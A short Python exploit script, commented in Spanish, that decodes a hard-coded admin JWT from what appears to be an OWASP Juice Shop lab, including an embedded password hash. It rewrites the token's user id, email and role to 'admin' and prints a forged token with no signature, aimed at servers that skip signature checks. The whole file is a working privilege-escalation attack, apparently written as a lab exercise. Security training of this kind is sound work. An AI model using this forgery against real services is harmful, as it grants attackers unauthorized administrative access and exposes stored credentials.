#!/usr/bin/env python3
import base64
import json

# Token actual
token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMTEtMjEgMDA6MDU6MjcuMDU5ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMTEtMjEgMDA6MDU6MjcuMDU5ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc2MzY4NTEwOX0.A6tXyjLZFzVSv0T09neiWOgPs8lBF8jTxCa-VBqzBpityvxb4ss0PVy4WJDNF-wfKtPp2QChZOKAZG5AJuRhPlpIIM8ICQpXrFWjDHcq2Aw5uQqYFLJcMo6aaLYW5i714JY1S5gpSzS0jIzXLQrNkS7SRnSWbdg8UOa6_CoFLFk"

def decode_jwt(token):
    """Decodifica un token JWT y retorna header y payload"""
    parts = token.split('.')
    
    # Decodificar header
    header_json = base64.b64decode(parts[0] + '==').decode('utf-8')
    header = json.loads(header_json)
    
    # Decodificar payload
    payload_json = base64.b64decode(parts[1] + '==').decode('utf-8')
    payload = json.loads(payload_json)
    
    return header, payload

def create_unsigned_token(header, payload):
    """Crea un token JWT sin firma para pruebas"""
    new_header = base64.b64encode(
        json.dumps(header).encode()
    ).decode().rstrip('=')
    
    new_payload = base64.b64encode(
        json.dumps(payload).encode()
    ).decode().rstrip('=')
    
    return f"{new_header}.{new_payload}."

def main():
    print("=== EXPLOTACIÓN DE VULNERABILIDAD JWT ===")
    print("Categoría OWASP: A02:2021-Cryptographic Failures\n")
    
    # Decodificar token original
    header, payload = decode_jwt(token)
    
    print("Header original:")
    print(json.dumps(header, indent=2))
    
    print("\nPayload original:")
    print(json.dumps(payload, indent=2))
    
    # Modificar el payload - cambiar a usuario diferente
    print("\n" + "="*50)
    print("MODIFICANDO PAYLOAD...")
    
    payload['data']['id'] = 2
    payload['data']['email'] = "user@juice-sh.op"
    payload['data']['role'] = "admin"  # Escalar privilegios
    
    print("Payload modificado:")
    print(json.dumps(payload, indent=2))
    
    # Crear nuevo token sin firma (para probar)
    print("\n" + "="*50)
    print("CREANDO NUEVO TOKEN (SIN FIRMA)...")
    
    new_token = create_unsigned_token(header, payload)
    print(f"Nuevo token (sin firma): {new_token}")
    
    # Advertencia de seguridad
    print("\n" + "!"*60)
    print("ADVERTENCIA: Este token no tiene firma válida.")
    print("Solo funciona si el servidor no verifica la firma JWT.")
    print("!"*60)

if __name__ == "__main__":
    main()
